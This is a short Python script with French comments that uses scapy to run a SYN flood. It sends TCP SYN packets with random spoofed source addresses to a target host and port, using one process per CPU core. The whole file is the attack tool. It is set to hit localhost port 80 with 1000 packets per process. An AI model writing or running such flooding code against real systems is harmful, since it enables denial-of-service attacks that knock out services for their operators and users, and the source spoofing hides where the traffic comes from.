from scapy.all import *
import multiprocessing

class ENVOIS:
    @staticmethod
    def syn(cible, port, nbrpaquet):
        # Fonction pour envoyer des paquets SYN
        def _envoyer_syn():
            for _ in range(nbrpaquet):
                # Création du paquet SYN avec une adresse IP source aléatoire et un numéro de port source aléatoire
                ip = IP(dst=cible, src=RandIP())  # adresse IP source aléatoire
                tcpsyn = TCP(dport=port, flags="S")  # paquet TCP avec le flag SYN
                # Envoie paquet
                send(ip/tcpsyn, verbose=False)  # verbose en false assure que je n'attends pas de réponse

        # Création des processus
        processus = []
        for _ in range(multiprocessing.cpu_count()):
            p = multiprocessing.Process(target=_envoyer_syn)
            processus.append(p)

        # Démarrage des processus
        for p in processus:
            p.start()

        # Attente que tous les processus se terminent
        for p in processus:
            p.join()

# Paramètres de test
cible = "127.0.0.1"  # cible
port = 80  # Port 
nbrpaquet = 1000  # nbr envois

# Appel de la méthode syn de la classe ENVOIS
ENVOIS.syn(cible, port, nbrpaquet)
